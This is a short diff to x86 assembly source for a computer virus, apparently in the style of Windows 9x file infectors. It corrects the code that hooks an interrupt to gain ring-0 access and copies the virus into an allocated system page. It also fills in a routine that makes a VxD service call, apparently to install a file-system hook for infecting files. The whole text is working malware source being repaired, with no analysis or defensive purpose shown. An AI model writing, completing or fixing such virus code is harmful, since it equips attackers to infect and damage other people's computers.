@@ -192,7 +192,7 @@ int HookExceptionNumber    ; To get ring
 
 ;************
 ;* EAX=&IntHandler
-;* ESI=&VirusSize
+;* ESI=VirusSize
 ;* EDI=&Allocated_page+VirusSize
 ;* ECX=0
 ;* EBX=&IDT+HookExceptionNumber
@@ -208,7 +208,7 @@ int HookExceptionNumber    ; To get ring
 ;* mov word [ebx+02h], si
 ;**************************************
 
-int HookExceptionHumber    ; Trigger exception again
+int HookExceptionNumber    ; Trigger exception again
 
 
 ExceptionOccured:
@@ -230,7 +230,7 @@ IntHandler:
 mov ecx, dr3
 jcxz AllocateSysPage
 
-jmp InstallFSHook
+jz InstallFSHook
 iretd
 
 AllocateSysPage:
@@ -263,7 +263,11 @@ rep movsb
 iretd             ; Return to ring 3
 
 InstallFSHook:
-
+sub edi, VirusSize
+push eax
+lea eax, [edi+(IntHandler-virus_start)]
+int 20h
+dd 00040093h
 
 
 virus_end:
